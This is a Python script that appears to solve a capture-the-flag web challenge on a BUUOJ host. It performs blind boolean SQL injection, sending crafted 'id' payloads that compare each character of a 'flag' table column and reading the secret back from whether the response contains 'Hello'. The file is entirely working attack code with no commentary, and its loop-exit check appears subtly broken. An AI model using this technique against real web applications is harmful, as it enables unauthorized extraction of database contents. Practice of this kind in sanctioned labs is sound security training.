import requests

def inject(i,ch):
    url = "http://79b48c23-5ade-4e0c-b1b9-e0ce16122836.node4.buuoj.cn"
    sql = "id=(select(ascii(mid(flag,"+str(i)+",1))="+str(ord(ch))+")from(flag))"
    data = {
        "id":sql,
    }
    headers={
        "User-agent":"Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
    }
    # success_len = 312
    resp = requests.post(url=url,data=data,headers=headers)
    # print(resp.text)
    if "Hello" in resp.text:
        return ch
    return ""

alphabase = "{-}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
ans = ""
prev = ans

for i in range(100):
    for ch in alphabase:
        ans += inject(i,ch)
        if prev != ans:
            prev = ans
            print("[*]:"+ans)
            break
    if  "}" ==ans[:-1]:
        break

print("[!]: ans:"+ans)